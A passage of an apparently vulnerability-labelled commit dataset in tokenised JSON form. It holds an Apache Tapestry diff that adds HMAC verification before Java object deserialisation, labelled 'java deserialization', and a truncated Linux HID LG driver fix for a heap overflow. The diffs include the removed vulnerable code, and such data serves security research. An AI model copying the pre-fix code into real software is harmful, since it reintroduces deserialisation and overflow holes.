{"contents": ["TAP5-2008:", "Implement", "HMAC", "signatures", "on", "object", "streams", "stored", "on", "the", "client"], "code_tokens": ["@", "@", "-", "341", ",", "7", "+", "341", ",", "6", "@", "@", "*", "Prefix", "to", "be", "used", "for", "all", "resource", "paths", ",", "used", "to", "recognize", "which", "requests", "are", "for", "assets", ".", "This", "value", "*", "is", "appended", "to", "the", "context", "path", "and", "the", "(", "optional", "{", "@", "linkplain", "#", "APPLICATION_FOLDER", "application", "folder", "}", ".", "*", "Its", "default", "is", "\"", "assets", "\"", ".", "It", "may", "contain", "slashes", ",", "but", "should", "not", "begin", "or", "end", "with", "one", ".", "*", "*", "/", "public", "static", "final", "String", "ASSET_PATH_PREFIX", "=", "\"", "tapestry", ".", "asset", "-", "path", "-", "prefix", "\"", ";", "@", "@", "-", "359", ",", "4", "+", "358", ",", "15", "@", "@", "*", "@", "since", "5", ".", "4", "*", "/", "public", "static", "final", "String", "CONTEXT_PATH", "=", "\"", "tapestry", ".", "context", "-", "path", "\"", ";", "/", "**", "*", "A", "passphrase", "used", "as", "the", "basis", "of", "hash", "-", "based", "message", "authentication", "(", "HMAC", ")", "for", "any", "object", "stream", "data", "stored", "on", "*", "the", "client", ".", "The", "default", "phrase", "is", "the", "empty", "string", ",", "which", "will", "result", "in", "a", "logged", "runtime", "<", "em", ">", "error", "<", "/", "em", ">", ".", "*", "You", "should", "configure", "this", "to", "a", "reasonable", "value", "(", "longer", "is", "better", ")", "and", "ensure", "that", "all", "servers", "in", "your", "cluster", "*", "share", "the", "same", "value", "(", "configuring", "this", "in", "code", ",", "rather", "than", "the", "command", "line", ",", "is", "preferred", ")", ".", "*", "*", "@", "see", "org", ".", "apache", ".", "tapestry5", ".", "services", ".", "ClientDataEncoder", "*", "@", "since", "5", ".", "3", ".", "6", "*", "/", "public", "static", "final", "String", "HMAC_PASSPHRASE", "=", "\"", "tapestry", ".", "hmac", "-", "passphrase", "\"", ";", "}", "@", "@", "-", "1", ",", "4", "+", "1", ",", "4", "@", "@", "/", "/", "Copyright", "2009", "The", "Apache", "Software", "Foundation", "/", "/", "Copyright", "2009", ",", "2012", "The", "Apache", "Software", "Foundation", "/", "/", "/", "/", "Licensed", "under", "the", "Apache", "License", ",", "Version", "2", ".", "0", "(", "the", "\"", "License", "\"", ");", "/", "/", "you", "may", "not", "use", "this", "file", "except", "in", "compliance", "with", "the", "License", ".", "@", "@", "-", "14", ",", "32", "+", "14", ",", "54", "@", "@", "package", "org", ".", "apache", ".", "tapestry5", ".", "internal", ".", "services", ";", "import", "org", ".", "apache", ".", "tapestry5", ".", "SymbolConstants", ";", "import", "org", ".", "apache", ".", "tapestry5", ".", "internal", ".", "TapestryInternalUtils", ";", "import", "org", ".", "apache", ".", "tapestry5", ".", "internal", ".", "util", ".", "Base64InputStream", ";", "import", "org", ".", "apache", ".", "tapestry5", ".", "internal", ".", "util", ".", "MacOutputStream", ";", "import", "org", ".", "apache", ".", "tapestry5", ".", "ioc", ".", "annotations", ".", "Symbol", ";", "import", "org", ".", "apache", ".", "tapestry5", ".", "services", ".", "ClientDataEncoder", ";", "import", "org", ".", "apache", ".", "tapestry5", ".", "services", ".", "ClientDataSink", ";", "import", "org", ".", "apache", ".", "tapestry5", ".", "services", ".", "URLEncoder", ";", "import", "org", ".", "slf4j", ".", "Logger", ";", "import", "javax", ".", "crypto", ".", "spec", ".", "SecretKeySpec", ";", "import", "java", ".", "io", ".", "BufferedInputStream", ";", "import", "java", ".", "io", ".", "IOException", ";", "import", "java", ".", "io", ".", "ObjectInputStream", ";", "import", "java", ".", "io", ".", "UnsupportedEncodingException", ";", "import", "java", ".", "security", ".", "Key", ";", "import", "java", ".", "util", ".", "zip", ".", "GZIPInputStream", ";", "public", "class", "ClientDataEncoderImpl", "implements", "ClientDataEncoder", "{", "private", "final", "URLEncoder", "urlEncoder", ";", "public", "ClientDataEncoderImpl", "(", "URLEncoder", "urlEncoder", ")", "private", "final", "Key", "hmacKey", ";", "public", "ClientDataEncoderImpl", "(", "URLEncoder", "urlEncoder", ",", "@", "Symbol", "(", "SymbolConstants", ".", "HMAC_PASSPHRASE", ")", "String", "passphrase", ",", "Logger", "logger", ")", "throws", "UnsupportedEncodingException", "{", "this", ".", "urlEncoder", "=", "urlEncoder", ";", "if", "(", "passphrase", ".", "equals", "(", "\"\"", "))", "{", "logger", ".", "error", "(", "String", ".", "format", "(", "\"", "The", "symbol", "'", "%", "s", "'", "has", "not", "been", "configured", ".", "\"", "\"", "This", "is", "used", "to", "configure", "hash", "-", "based", "message", "authentication", "of", "Tapestry", "data", "stored", "in", "forms", ",", "or", "in", "the", "URL", ".", "\"", "\"", "You", "application", "is", "less", "secure", ",", "and", "more", "vulnerable", "to", "denial", "-", "of", "-", "service", "attacks", ",", "when", "this", "symbol", "is", "left", "unconfigured", ".", "\",", "SymbolConstants", ".", "HMAC_PASSPHRASE", ")", ");", "/", "/", "Errors", "at", "lower", "levels", "if", "the", "passphrase", "is", "empty", ",", "so", "override", "the", "parameter", "to", "set", "a", "default", "value", ".", "passphrase", "=", "\"", "DEFAULT", "\"", ";", "}", "hmacKey", "=", "new", "SecretKeySpec", "(", "passphrase", ".", "getBytes", "(", "\"", "UTF8", "\"", "),", "\"", "HmacSHA1", "\"", ");", "}", "public", "ClientDataSink", "createSink", "(", ")", "{", "try", "{", "return", "new", "ClientDataSinkImpl", "(", "urlEncoder", ")", ";", "}", "catch", "(", "IOException", "ex", ")", "return", "new", "ClientDataSinkImpl", "(", "urlEncoder", ",", "hmacKey", ")", ";", "}", "catch", "(", "IOException", "ex", ")", "{", "throw", "new", "RuntimeException", "(", "ex", ")", ";", "}", "@", "@", "-", "48", ",", "21", "+", "70", ",", "57", "@", "@", "public", "ClientDataSink", "createSink", "(", ")", "public", "ObjectInputStream", "decodeClientData", "(", "String", "clientData", ")", "{", "/", "/", "The", "clientData", "is", "Base64", "that", "'", "s", "been", "gzip", "'", "ed", "(", "i", ".", "e", ".", ",", "this", "matches", "/", "/", "what", "ClientDataSinkImpl", "does", ".", "/", "/", "what", "ClientDataSinkImpl", "does", ")", ".", "int", "colonx", "=", "clientData", ".", "indexOf", "(", "':", "')", ";", "if", "(", "colonx", "<", "0", ")", "{", "throw", "new", "IllegalArgumentException", "(", "\"", "Client", "data", "must", "be", "prefixed", "with", "its", "HMAC", "code", ".", "\")", ";", "}", "/", "/", "Extract", "the", "string", "presumably", "encoded", "by", "the", "server", "using", "the", "secret", "key", ".", "String", "storedHmacResult", "=", "clientData", ".", "substring", "(", "0", ",", "colonx", ")", ";", "String", "clientStream", "=", "clientData", ".", "substring", "(", "colonx", "+", "1", ")", ";", "try", "{", "BufferedInputStream", "buffered", "=", "new", "BufferedInputStream", "(", "new", "GZIPInputStream", "(", "new", "Base64InputStream", "(", "clientData", ")", "))", ";", "Base64InputStream", "b64in", "=", "new", "Base64InputStream", "(", "clientStream", ")", ";", "validateHMAC", "(", "storedHmacResult", ",", "b64in", ")", ";", "/", "/", "After", "reading", "it", "once", "to", "validate", ",", "reset", "it", "for", "the", "actual", "read", "(", "which", "includes", "the", "GZip", "decompression", ")", ".", "b64in", ".", "reset", "(", ");", "BufferedInputStream", "buffered", "=", "new", "BufferedInputStream", "(", "new", "GZIPInputStream", "(", "b64in", ")", ");", "return", "new", "ObjectInputStream", "(", "buffered", ")", ";", "}", "catch", "(", "IOException", "ex", ")", "}", "catch", "(", "IOException", "ex", ")", "{", "throw", "new", "RuntimeException", "(", "ex", ")", ";", "}", "}", "private", "void", "validateHMAC", "(", "String", "storedHmacResult", ",", "Base64InputStream", "b64in", ")", "throws", "IOException", "{", "MacOutputStream", "macOs", "=", "MacOutputStream", ".", "streamFor", "(", "hmacKey", ")", ";", "TapestryInternalUtils", ".", "copy", "(", "b64in", ",", "macOs", ")", ";", "macOs", ".", "close", "(", ");", "String", "actual", "=", "macOs", ".", "getResult", "(", ");", "if", "(", "!", "storedHmacResult", ".", "equals", "(", "actual", ")", ")", "{", "throw", "new", "IOException", "(", "\"", "Client", "data", "associated", "with", "the", "current", "request", "appears", "to", "have", "been", "tampered", "with", "\"", "\"", "(", "the", "HMAC", "signature", "does", "not", "match", ")", ".\"", ");", "}", "}", "public", "ObjectInputStream", "decodeEncodedClientData", "(", "String", "clientData", ")", "throws", "IOException", "{", "return", "decodeClientData", "(", "urlEncoder", ".", "decode", "(", "clientData", ")", ");", "@", "@", "-", "1", ",", "4", "+", "1", ",", "4", "@", "@", "/", "/", "Copyright", "2009", "The", "Apache", "Software", "Foundation", "/", "/", "Copyright", "2009", ",", "2012", "The", "Apache", "Software", "Foundation", "/", "/", "/", "/", "Licensed", "under", "the", "Apache", "License", ",", "Version", "2", ".", "0", "(", "the", "\"", "License", "\"", ");", "/", "/", "you", "may", "not", "use", "this", "file", "except", "in", "compliance", "with", "the", "License", ".", "@", "@", "-", "15", ",", "13", "+", "15", ",", "16", "@", "@", "package", "org", ".", "apache", ".", "tapestry5", ".", "internal", ".", "services", ";", "import", "org", ".", "apache", ".", "tapestry5", ".", "internal", ".", "util", ".", "Base64OutputStream", ";", "import", "org", ".", "apache", ".", "tapestry5", ".", "internal", ".", "util", ".", "MacOutputStream", ";", "import", "org", ".", "apache", ".", "tapestry5", ".", "internal", ".", "util", ".", "TeeOutputStream", ";", "import", "org", ".", "apache", ".", "tapestry5", ".", "services", ".", "ClientDataSink", ";", "import", "org", ".", "apache", ".", "tapestry5", ".", "services", ".", "URLEncoder", ";", "import", "java", ".", "io", ".", "BufferedOutputStream", ";", "import", "java", ".", "io", ".", "IOException", ";", "import", "java", ".", "io", ".", "ObjectOutputStream", ";", "import", "java", ".", "io", ".", "OutputStream", ";", "import", "java", ".", "security", ".", "Key", ";", "import", "java", ".", "util", ".", "zip", ".", "GZIPOutputStream", ";", "public", "class", "ClientDataSinkImpl", "implements", "ClientDataSink", "@", "@", "-", "34", ",", "12", "+", "37", ",", "17", "@", "@", "private", "boolean", "closed", ";", "public", "ClientDataSinkImpl", "(", "URLEncoder", "urlEncoder", ")", "throws", "IOException", "private", "final", "MacOutputStream", "macOutputStream", ";", "public", "ClientDataSinkImpl", "(", "URLEncoder", "urlEncoder", ",", "Key", "hmacKey", ")", "throws", "IOException", "{", "this", ".", "urlEncoder", "=", "urlEncoder", ";", "base64OutputStream", "=", "new", "Base64OutputStream", "(", ");", "macOutputStream", "=", "MacOutputStream", ".", "streamFor", "(", "hmacKey", ")", ";", "final", "BufferedOutputStream", "pipeline", "=", "new", "BufferedOutputStream", "(", "new", "GZIPOutputStream", "(", "base64OutputStream", ")", ");", "final", "BufferedOutputStream", "pipeline", "=", "new", "BufferedOutputStream", "(", "new", "GZIPOutputStream", "(", "new", "TeeOutputStream", "(", "macOutputStream", ",", "base64OutputStream", ")", "))", ";", "OutputStream", "guard", "=", "new", "OutputStream", "(", ")", "{", "@", "@", "-", "92", ",", "14", "+", "100", ",", "13", "@", "@", "public", "String", "getClientData", "(", ")", "try", "{", "objectOutputStream", ".", "close", "(", ");", "}", "catch", "(", "IOException", "ex", ")", "}", "catch", "(", "IOException", "ex", ")", "{", "/", "/", "Ignore", ".", "}", "}", "return", "base64OutputStream", ".", "toBase64", "(", ");", "return", "macOutputStream", ".", "getResult", "(", ")", "+", "\"", ":\"", "+", "base64OutputStream", ".", "toBase64", "(", ");", "}", "public", "String", "getEncodedClientData", "(", ")", "@", "@", "-", "0", ",", "0", "+", "1", ",", "86", "@", "@", "/", "/", "Copyright", "2012", "The", "Apache", "Software", "Foundation", "/", "/", "/", "/", "Licensed", "under", "the", "Apache", "License", ",", "Version", "2", ".", "0", "(", "the", "\"", "License", "\"", ");", "/", "/", "you", "may", "not", "use", "this", "file", "except", "in", "compliance", "with", "the", "License", ".", "/", "/", "You", "may", "obtain", "a", "copy", "of", "the", "License", "at", "/", "/", "/", "/", "http", ":", "//", "www", ".", "apache", ".", "org", "/", "licenses", "/", "LICENSE", "-", "2", ".", "0", "/", "/", "/", "/", "Unless", "required", "by", "applicable", "law", "or", "agreed", "to", "in", "writing", ",", "software", "/", "/", "distributed", "under", "the", "License", "is", "distributed", "on", "an", "\"", "AS", "IS", "\"", "BASIS", ",", "/", "/", "WITHOUT", "WARRANTIES", "OR", "CONDITIONS", "OF", "ANY", "KIND", ",", "either", "express", "or", "implied", ".", "/", "/", "See", "the", "License", "for", "the", "specific", "language", "governing", "permissions", "and", "/", "/", "limitations", "under", "the", "License", ".", "package", "org", ".", "apache", ".", "tapestry5", ".", "internal", ".", "util", ";", "import", "org", ".", "apache", ".", "commons", ".", "codec", ".", "binary", ".", "Base64", ";", "import", "org", ".", "apache", ".", "tapestry5", ".", "ioc", ".", "internal", ".", "util", ".", "InternalUtils", ";", "import", "javax", ".", "crypto", ".", "Mac", ";", "import", "java", ".", "io", ".", "IOException", ";", "import", "java", ".", "io", ".", "OutputStream", ";", "import", "java", ".", "security", ".", "Key", ";", "/", "**", "*", "An", "output", "stream", "that", "wraps", "around", "a", "{", "@", "link", "Mac", "}", "(", "message", "authentication", "code", "algorithm", ")", ".", "This", "is", "currently", "*", "used", "for", "symmetric", "(", "private", ")", "keys", ",", "but", "in", "theory", "could", "be", "used", "with", "assymetric", "(", "public", "/", "private", ")", "keys", ".", "*", "*", "@", "since", "5", ".", "3", ".", "6", "*", "/", "public", "class", "MacOutputStream", "extends", "OutputStream", "{", "private", "final", "Mac", "mac", ";", "public", "static", "MacOutputStream", "streamFor", "(", "Key", "key", ")", "throws", "IOException", "{", "try", "{", "Mac", "mac", "=", "Mac", ".", "getInstance", "(", "key", ".", "getAlgorithm", "(", "))", ";", "mac", ".", "init", "(", "key", ")", ";", "return", "new", "MacOutputStream", "(", "mac", ")", ";", "}", "catch", "(", "Exception", "ex", ")", "{", "throw", "new", "IOException", "(", "\"", "Unable", "to", "create", "MacOutputStream", ":", "\"", "+", "InternalUtils", ".", "toMessage", "(", "ex", ")", ",", "ex", ")", ";", "}", "}", "public", "MacOutputStream", "(", "Mac", "mac", ")", "{", "assert", "mac", "!", "=", "null", ";", "this", ".", "mac", "=", "mac", ";", "}", "/", "**", "*", "Should", "only", "be", "invoked", "once", ",", "immediately", "after", "this", "stream", "is", "closed", ";", "it", "generates", "the", "final", "MAC", "result", ",", "and", "*", "returns", "it", "as", "a", "Base64", "encoded", "string", ".", "*", "*", "@", "return", "Base64", "encoded", "MAC", "result", "*", "/", "public", "String", "getResult", "(", ")", "{", "byte", "[", "]", "result", "=", "mac", ".", "doFinal", "(", ");", "return", "new", "String", "(", "Base64", ".", "encodeBase64", "(", "result", ")", ");", "}", "@", "Override", "public", "void", "write", "(", "int", "b", ")", "throws", "IOException", "{", "mac", ".", "update", "(", "(", "byte", ")", "b", ")", ";", "}", "@", "Override", "public", "void", "write", "(", "byte", "[", "]", "b", ")", "throws", "IOException", "{", "mac", ".", "update", "(", "b", ")", ";", "}", "@", "Override", "public", "void", "write", "(", "byte", "[", "]", "b", ",", "int", "off", ",", "int", "len", ")", "throws", "IOException", "{", "mac", ".", "update", "(", "b", ",", "off", ",", "len", ")", ";", "}", "}", "@", "@", "-", "0", ",", "0", "+", "1", ",", "73", "@", "@", "/", "/", "Copyright", "2012", "The", "Apache", "Software", "Foundation", "/", "/", "/", "/", "Licensed", "under", "the", "Apache", "License", ",", "Version", "2", ".", "0", "(", "the", "\"", "License", "\"", ");", "/", "/", "you", "may", "not", "use", "this", "file", "except", "in", "compliance", "with", "the", "License", ".", "/", "/", "You", "may", "obtain", "a", "copy", "of", "the", "License", "at", "/", "/", "/", "/", "http", ":", "//", "www", ".", "apache", ".", "org", "/", "licenses", "/", "LICENSE", "-", "2", ".", "0", "/", "/", "/", "/", "Unless", "required", "by", "applicable", "law", "or", "agreed", "to", "in", "writing", ",", "software", "/", "/", "distributed", "under", "the", "License", "is", "distributed", "on", "an", "\"", "AS", "IS", "\"", "BASIS", ",", "/", "/", "WITHOUT", "WARRANTIES", "OR", "CONDITIONS", "OF", "ANY", "KIND", ",", "either", "express", "or", "implied", ".", "/", "/", "See", "the", "License", "for", "the", "specific", "language", "governing", "permissions", "and", "/", "/", "limitations", "under", "the", "License", ".", "package", "org", ".", "apache", ".", "tapestry5", ".", "internal", ".", "util", ";", "import", "java", ".", "io", ".", "IOException", ";", "import", "java", ".", "io", ".", "OutputStream", ";", "/", "**", "*", "An", "output", "stream", "that", "acts", "like", "a", "\"", "tee", "\"", ",", "copying", "all", "provided", "bytes", "to", "two", "output", "streams", ".", "This", "is", "used", ",", "for", "example", ",", "*", "to", "accumulate", "a", "hash", "of", "content", "even", "as", "it", "is", "being", "written", ".", "*", "*", "@", "since", "5", ".", "3", ".", "5", "*", "/", "public", "class", "TeeOutputStream", "extends", "OutputStream", "{", "private", "final", "OutputStream", "left", ",", "right", ";", "public", "TeeOutputStream", "(", "OutputStream", "left", ",", "OutputStream", "right", ")", "{", "assert", "left", "!", "=", "null", ";", "assert", "right", "!", "=", "null", ";", "this", ".", "left", "=", "left", ";", "this", ".", "right", "=", "right", ";", "}", "@", "Override", "public", "void", "write", "(", "int", "b", ")", "throws", "IOException", "{", "left", ".", "write", "(", "b", ")", ";", "right", ".", "write", "(", "b", ")", ";", "}", "@", "Override", "public", "void", "write", "(", "byte", "[", "]", "b", ")", "throws", "IOException", "{", "left", ".", "write", "(", "b", ")", ";", "right", ".", "write", "(", "b", ")", ";", "}", "@", "Override", "public", "void", "write", "(", "byte", "[", "]", "b", ",", "int", "off", ",", "int", "len", ")", "throws", "IOException", "{", "left", ".", "write", "(", "b", ",", "off", ",", "len", ")", ";", "right", ".", "write", "(", "b", ",", "off", ",", "len", ")", ";", "}", "@", "Override", "public", "void", "flush", "(", ")", "throws", "IOException", "{", "left", ".", "flush", "(", ");", "right", ".", "flush", "(", ");", "}", "@", "Override", "public", "void", "close", "(", ")", "throws", "IOException", "{", "left", ".", "close", "(", ");", "right", ".", "close", "(", ");", "}", "}", "@", "@", "-", "1", ",", "4", "+", "1", ",", "4", "@", "@", "/", "/", "Copyright", "2009", "The", "Apache", "Software", "Foundation", "/", "/", "Copyright", "2009", ",", "2012", "The", "Apache", "Software", "Foundation", "/", "/", "/", "/", "Licensed", "under", "the", "Apache", "License", ",", "Version", "2", ".", "0", "(", "the", "\"", "License", "\"", ");", "/", "/", "you", "may", "not", "use", "this", "file", "except", "in", "compliance", "with", "the", "License", ".", "@", "@", "-", "21", ",", "6", "+", "21", ",", "10", "@", "@", "*", "A", "service", "used", "when", "a", "component", "or", "service", "needs", "to", "encode", "some", "amount", "of", "data", "on", "the", "client", "as", "a", "string", ".", "The", "string", "*", "may", "be", "a", "query", "parameter", ",", "hidden", "form", "field", ",", "or", "a", "portion", "of", "a", "URL", ".", "The", "default", "implementation", "converts", "the", "object", "*", "output", "stream", "into", "a", "Base64", "string", ".", "*", "<", "p", "/", ">", "*", "Starting", "in", "release", "5", ".", "3", ".", "6", ",", "the", "encoded", "data", "incorporates", "an", "HMAC", "(", "hash", "based", "message", "authentication", "code", ")", "signature", ",", "*", "as", "a", "prefix", ".", "HMAC", "requires", "a", "secret", "key", ",", "configured", "using", "the", "*", "{", "@", "link", "org", ".", "apache", ".", "tapestry5", ".", "SymbolConstants", "#", "HMAC_PASSPHRASE", "}", "symbol", ".", "*", "*", "@", "since", "5", ".", "1", ".", "0", ".", "1", "*", "/", "@", "@", "-", "37", ",", "17", "+", "41", ",", "22", "@", "@", "/", "**", "*", "Decodes", "data", "previously", "obtained", "from", "{", "@", "link", "ClientDataSink", "#", "getClientData", "(", ")}", ".", "*", "*", "@", "param", "clientData", "encoded", "client", "data", "*", "@", "param", "clientData", "*", "encoded", "client", "data", "*", "@", "return", "stream", "of", "decoded", "data", "*", "@", "throws", "IOException", "*", "if", "the", "client", "data", "has", "been", "corrupted", "(", "verified", "via", "the", "HMAC", ")", "*", "/", "ObjectInputStream", "decodeClientData", "(", "String", "clientData", ")", "throws", "IOException", ";", "/", "**", "*", "Decoes", "client", "data", "obtained", "via", "{", "@", "link", "ClientDataSink", "#", "getEncodedClientData", "(", ")}", ".", "*", "Decodes", "client", "data", "obtained", "via", "{", "@", "link", "ClientDataSink", "#", "getEncodedClientData", "(", ")}", ".", "*", "*", "@", "param", "clientData", "URLEncoded", "client", "data", "*", "@", "param", "clientData", "*", "URLEncoded", "client", "data", "*", "@", "return", "stream", "of", "objects", "*", "@", "throws", "IOException", "*", "if", "the", "client", "data", "has", "been", "corrupted", "(", "verified", "via", "the", "HMAC", ")", "*", "@", "since", "5", ".", "1", ".", "0", ".", "4", "*", "/", "ObjectInputStream", "decodeEncodedClientData", "(", "String", "clientData", ")", "throws", "IOException", ";", "@", "@", "-", "2224", ",", "6", "+", "2224", ",", "10", "@", "@", "public", "static", "void", "contributeFactoryDefaults", "(", "MappedConfiguration", "<", "String", ",", "Object", ">", "configuration", ".", "add", "(", "SymbolConstants", ".", "REQUIRE_JS", ",", "\"", "classpath", ":", "org", "/", "apache", "/", "tapestry5", "/", "require_2", ".", "0", ".", "2", ".", "js", "\"", ");", "configuration", ".", "add", "(", "SymbolConstants", ".", "CONTEXT_PATH", ",", "\"", "\")", ";", "/", "/", "Leaving", "this", "as", "the", "default", "results", "in", "a", "runtime", "error", "logged", "to", "the", "console", "(", "and", "a", "default", "password", "is", "used", ")", ";", "/", "/", "you", "are", "expected", "to", "override", "this", "symbol", ".", "configuration", ".", "add", "(", "SymbolConstants", ".", "HMAC_PASSPHRASE", ",", "\"", "\")", ";", "}", "/", "**", "@", "@", "-", "0", ",", "0", "+", "1", ",", "108", "@", "@", "package", "org", ".", "apache", ".", "tapestry5", ".", "internal", ".", "services", "import", "org", ".", "apache", ".", "tapestry5", ".", "ioc", ".", "test", ".", "TestBase", "import", "org", ".", "apache", ".", "tapestry5", ".", "services", ".", "ClientDataEncoder", "import", "org", ".", "easymock", ".", "EasyMock", "import", "org", ".", "slf4j", ".", "Logger", "import", "org", ".", "testng", ".", "annotations", ".", "Test", "class", "ClientDataEncoderImplTest", "extends", "TestBase", "{", "def", "tryEncodeAndDecode", "(", "ClientDataEncoder", "cde", ")", "{", "def", "now", "=", "new", "Date", "(", ")", "def", "input", "=", "\"", "The", "current", "time", "is", "$", "now", "\"", "String", "clientData", "=", "convertToClientData", "cde", ",", "input", "def", "stream", "=", "cde", ".", "decodeClientData", "clientData", "def", "output", "=", "stream", ".", "readObject", "(", ")", "assert", "!", "input", ".", "is", "(", "output", ")", "assert", "input", "=", "=", "output", "}", "def", "String", "convertToClientData", "(", "ClientDataEncoder", "cde", ",", "input", ")", "{", "def", "sink", "=", "cde", ".", "createSink", "(", ")", "sink", ".", "getObjectOutputStream", "(", ").", "with", "{", "stream", "-", ">", "stream", "<", "<", "input", "stream", ".", "close", "(", ")", "}", "sink", ".", "clientData", "}", "def", "extractData", "(", "String", "encoded", ")", "{", "def", "colonx", "=", "encoded", ".", "indexOf", "(", "':", "')", "encoded", ".", "substring", "(", "colonx", "+", "1", ")", "}", "@", "Test", "void", "blank_passphrase_works_but_logs_error", "(", ")", "{", "Logger", "logger", "=", "newMock", "Logger", "logger", ".", "error", "(", "EasyMock", ".", "isA", "(", "String", ")", ")", "replay", "(", ")", "ClientDataEncoder", "cde", "=", "new", "ClientDataEncoderImpl", "(", "null", ",", "\"", "\",", "logger", ")", "tryEncodeAndDecode", "cde", "verify", "(", ")", "}", "@", "Test", "void", "no_logged_error_with_non_blank_passphrase", "(", ")", "{", "ClientDataEncoder", "cde", "=", "new", "ClientDataEncoderImpl", "(", "null", ",", "\"", "Testing", ",", "Testing", ",", "1", ".", ".,", "2", ".", ".,", "3", ".", "..", "\",", "null", ")", "tryEncodeAndDecode", "cde", "}", "@", "Test", "void", "passphrase_affects_encoded_output", "(", ")", "{", "ClientDataEncoder", "first", "=", "new", "ClientDataEncoderImpl", "(", "null", ",", "\"", "first", "passphrase", "\"", ",", "null", ")", "ClientDataEncoder", "second", "=", "new", "ClientDataEncoderImpl", "(", "null", ",", "\"", "different", "passphrase", "\"", ",", "null", ")", "def", "input", "=", "\"", "current", "time", "millis", "is", "$", "{", "System", ".", "currentTimeMillis", "(", ")}", "ms", "\"", "def", "output1", "=", "convertToClientData", "first", ",", "input", "def", "output2", "=", "convertToClientData", "second", ",", "input", "assert", "output1", "!", "=", "output2", "assert", "extractData", "(", "output1", ")", "=", "=", "extractData", "(", "output2", ")", "}", "@", "Test", "(", "expectedExceptions", "=", "IllegalArgumentException", ")", "void", "decode_with_missing_hmac_prefix_is_a_failure", "(", ")", "{", "ClientDataEncoder", "cde", "=", "new", "ClientDataEncoderImpl", "(", "null", ",", "\"", "a", "passphrase", "\"", ",", "null", ")", "cde", ".", "decodeClientData", "(", "\"", "so", "completely", "invalid", "\"", ")", "}", "@", "Test", "void", "incorrect_hmac_is_detected", "(", ")", "{", "/", "/", "Simulate", "tampering", "by", "encoding", "with", "one", "passphrase", "and", "attempting", "to", "decode", "with", "a", "different", "/", "/", "passphrase", ".", "ClientDataEncoder", "first", "=", "new", "ClientDataEncoderImpl", "(", "null", ",", "\"", "first", "passphrase", "\"", ",", "null", ")", "ClientDataEncoder", "second", "=", "new", "ClientDataEncoderImpl", "(", "null", ",", "\"", "different", "passphrase", "\"", ",", "null", ")", "def", "input", "=", "\"", "current", "time", "millis", "is", "$", "{", "System", ".", "currentTimeMillis", "(", ")}", "ms", "\"", "def", "output", "=", "convertToClientData", "first", ",", "input", "try", "{", "second", ".", "decodeClientData", "(", "output", ")", "unreachable", "(", ")", "}", "catch", "(", "Exception", "e", ")", "{", "assert", "e", ".", "message", ".", "contains", "(", "\"", "HMAC", "signature", "does", "not", "match", "\"", ")", "}", "}", "}", "@", "@", "-", "145", ",", "6", "+", "145", ",", "8", "@", "@", "public", "static", "void", "contributeApplicationDefaults", "(", "MappedConfiguration", "<", "String", ",", "Str", "configuration", ".", "add", "(", "SymbolConstants", ".", "SECURE_ENABLED", ",", "\"", "true", "\"", ");", "configuration", ".", "add", "(", "\"", "app", ".", "injected", "-", "symbol", "\"", ",", "\"", "Symbol", "contributed", "to", "ApplicationDefaults", "\"", ");", "configuration", ".", "add", "(", "SymbolConstants", ".", "HMAC_PASSPHRASE", ",", "\"", "testing", ",", "testing", ",", "1", ".", "..", "2", ".", "..", "3", ".", "..", "\")", ";", "}", "public", "static", "void", "contributeIgnoredPathsFilter", "(", "Configuration", "<", "String", ">", "configuration", ")"], "docstring_tokens": ["java", "deserialization"]}
{"contents": ["HID:", "LG:", "validate", "HID", "output", "report", "details", "A", "HID", "device", "could", "send", "a", "malicious", "output", "report", "that", "would", "cause", "the", "lg,", "lg3,", "and", "lg4", "HID", "drivers", "to", "write", "beyond", "the", "output", "report", "allocation", "during", "an", "event,", "causing", "a", "heap", "overflow:", "[", "325.245240]", "usb", "1-1:", "New", "USB", "device", "found,", "idVendor=046d,", "idProduct=c287", "...", "[", "414.518960]", "BUG", "kmalloc-4096", "(Not", "tainted):", "Redzone", "overwritten", "Additionally,", "while", "lg2", "did", "correctly", "validate", "the", "report", "details,", "it", "was", "cleaned", "up", "and", "shortened.", "Signed-off-by:", "Kees", "Cook", "<keescook@chromium.org>", "Cc:", "stable@vger.kernel.org", "Reviewed-by:", "Benjamin", "Tissoires", "<benjamin.tissoires@redhat.com>", "Signed-off-by:", "Jiri", "Kosina", "<jkosina@suse.cz>"], "code_tokens": ["@", "@", "-", "64", ",", "26", "+", "64", ",", "13", "@", "@", "int", "lg2ff_init", "(", "struct", "hid_device", "*", "hid", ")", "struct", "hid_report", "*", "report", ";", "struct", "hid_input", "*", "hidinput", "=", "list_entry", "(", "hid", "-", ">", "inputs", ".", "next", ",", "struct", "hid_input", ",", "list", ")", ";", "struct", "list_head", "*", "report_list", "=", "&", "hid", "-", ">", "report_enum", "[", "HID_OUTPUT_REPORT", "]", ".", "report_list", ";", "struct", "input_dev", "*", "dev", "=", "hidinput", "-", ">", "input", ";", "int", "error", ";", "if", "(", "list_empty", "(", "report_list", ")", ")", "{", "hid_err", "(", "hid", ",", "\"", "no", "output", "report", "found", "\\", "n", "\"", ");", "/", "*", "Check", "that", "the", "report", "looks", "ok", "*", "/", "report", "=", "hid_validate_values", "(", "hid", ",", "HID_OUTPUT_REPORT", ",", "0", ",", "0", ",", "7", ")", ";", "if", "(", "!", "report", ")", "return", "-", "ENODEV", ";", "}", "report", "=", "list_entry", "(", "report_list", "-", ">", "next", ",", "struct", "hid_report", ",", "list", ")", ";", "if", "(", "report", "-", ">", "maxfield", "<", "1", ")", "{", "hid_err", "(", "hid", ",", "\"", "output", "report", "is", "empty", "\\", "n", "\"", ");", "return", "-", "ENODEV", ";", "}", "if", "(", "report", "-", ">", "field", "[", "0", "]", "->", "report_count", "<", "7", ")", "{", "hid_err", "(", "hid", ",", "\"", "not", "enough", "values", "in", "the", "field", "\\", "n", "\"", ");", "return", "-", "ENODEV", ";", "}", "lg2ff", "=", "kmalloc", "(", "sizeof", "(", "struct", "lg2ff_device", ")", ",", "GFP_KERNEL", ")", ";", "if", "(", "!", "lg2ff", ")", "@", "@", "-", "66", ",", "10", "+", "66", ",", "11", "@", "@", "static", "int", "hid_lg3ff_play", "(", "struct", "input_dev", "*", "dev", ",", "void", "*", "data", ",", "int", "x", ",", "y", ";", "/", "*", "*", "Maxusage", "should", "always", "be", "63", "(", "maximum", "fields", ")", "*", "likely", "a", "better", "way", "to", "ensure", "this", "data", "is", "clean", "*", "Available", "values", "in", "the", "field", "should", "always", "be", "63", ",", "but", "we", "only", "use", "up", "to", "*", "35", ".", "Instead", ",", "clear", "the", "entire", "area", ",", "however", "big", "it", "is", ".", "*", "/", "memset", "(", "report", "-", ">", "field", "[", "0", "]", "->", "value", ",", "0", ",", "sizeof", "(", "__s32", ")", "*", 